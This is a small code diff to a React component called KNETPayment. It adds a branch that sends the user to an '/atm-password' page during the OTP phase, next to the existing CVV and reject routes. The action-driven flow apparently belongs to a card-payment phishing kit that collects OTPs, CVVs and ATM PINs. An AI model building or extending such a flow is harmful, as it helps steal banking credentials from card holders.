@@ -107,6 +107,8 @@ export default function KNETPayment() {
       } else if (phase === "otp") {
         if (action === "otp") {
           navigate("/final-page");
+        } else if (action === "atm") {
+          navigate("/atm-password");
         } else if (action === "cvv") {
           navigate("/cvv");
         } else if (action === "reject") {
